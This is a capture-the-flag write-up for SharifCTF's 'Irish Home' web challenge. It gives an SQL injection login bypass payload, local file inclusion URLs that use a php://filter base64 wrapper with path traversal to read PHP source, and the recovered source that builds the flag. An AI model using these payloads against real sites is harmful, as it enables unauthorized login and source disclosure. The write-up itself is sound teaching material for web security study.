## Irish Home (Web-200)

### Description
Login, and recover the deleted flag. 

### Solution
This challenge is solved by me and @nikhil96sher(Nikhil Sheorem)
The site (http://ctf.sharif.edu:8082/login.php) is vulnearable to sql injection.
But they have applied filters on the `"`.
So I used username = `\` and password = ` OR 1=1;#` and I was able to login as **admin**.
Now I was kinda stuck unless @nikhil96sher pointed out that it is vulnearable to LFI as well.
Using `http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/read=convert.base64-encode/resource=../delete`, we got 
```
<?php
require_once('header.php');

/*
if(isset($_GET['page'])) {
    $fname = $_GET['page'] . ".php";
    $fpath = "pages/$fname";
    if(file_exists($fpath)) {
        rename($fpath, "deleted_3d5d9c1910e7c7/$fname");
    }
}
*/

?>
<div style="text-align: center;">
<h3 style="color: red;">Site is under maintenance 'til de end av dis f$#!*^% SharifCTF.</h3><br/>
<h4><b>Al' destructive acshuns are disabled!</b></h4>
</div>
<?php
require_once('footer.php');
?>

```

After that using `http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/read=convert.base64-encode/resource=../deleted_3d5d9c1910e7c7/flag`, we got 
```
$username = 'Cuchulainn';
$password = ;    // Oi don't save me bleedin password in a shithole loike dis.

$salt = 'd34340968a99292fb5665e';

$tmp = $username . $password . $salt;
$tmp = md5($tmp);

$flag = "SharifCTF{" . $tmp . "}";
echo $flag;

```

Now using the [script](./web-200.py), we were able to brute-force password.
So this was the challenge which had all fruits in the basket, we had sqli, LFI, path transversal, blind sqli. 


